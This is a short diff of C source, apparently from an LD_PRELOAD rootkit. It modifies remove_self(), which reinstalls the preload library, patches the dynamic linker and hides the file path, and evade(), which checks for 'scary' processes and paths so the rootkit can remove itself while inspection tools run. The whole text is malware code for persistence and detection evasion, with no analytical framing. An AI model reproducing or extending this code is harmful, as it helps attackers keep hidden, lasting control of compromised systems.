@@ -21,10 +21,10 @@ int remove_self(void){
     wait(NULL);
 #ifdef PATCH_DYNAMIC_LINKER
     ldpatch(OLD_PRELOAD, PRELOAD_FILE);
-    reinstall(PRELOAD_FILE);
+    reinstall(PRELOAD_FILE, INSTALL_DIR, BDVLSO);
     hide_path(PRELOAD_FILE);
 #else
-    reinstall(OLD_PRELOAD);
+    reinstall(OLD_PRELOAD, INSTALL_DIR, BDVLSO);
     hide_path(OLD_PRELOAD);
 #endif
     return VEVADE_DONE;
@@ -34,7 +34,7 @@ int remove_self(void){
 /* checks all of the scary_* arrays created by setup.py against execve/p args.
  * the scary_procs loop checks the name of the calling process as well. */
 int evade(const char *filename, char *const argv[], char *const envp[]){
-    if(rknomore())
+    if(rknomore(INSTALL_DIR, BDVLSO))
         return VNOTHING_DONE;
 
     char *scary_proc, *scary_path;
